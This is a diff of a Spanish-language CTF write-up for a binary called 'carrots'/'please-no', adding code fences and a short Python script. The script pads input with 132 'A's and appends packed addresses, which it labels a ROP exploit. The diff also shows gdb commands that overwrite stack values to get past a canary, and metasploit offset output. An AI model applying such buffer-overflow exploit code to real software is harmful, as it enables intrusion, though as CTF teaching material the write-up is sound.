@@ -49,16 +49,35 @@ Lo metemos en gdb y nos da una dirección que se corresponde con una parte del p
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 150 -q 0x37654136
 [*] Exact match at offset 140
 ```
-
-
-
+```
 objdump -x carrots | grep CARR
 08049570 g     F .text	0000021a              _Z6CARROTv
-
-
+```
+```
 br *0x804981c
 
 set {int}0xbffff334=0x42495244
 set {int}0xbffff338=0x00000000
 set {int}0xbffff33c=0x08049570
 evitar canary
+```
+
+```python
+#!/usr/bin/python
+# Fichero pwn_please_no.py 
+# Exploit ROP
+
+
+from struct import pack
+
+binary = "please-no"
+junk = "A" * 132
+
+rop = pack('<I', 0x42495244)   
+rop += pack('<I', 0x00000000)    
+rop += pack('<I', 0x08049570)   
+
+
+payload = junk + rop 
+print payload
+```
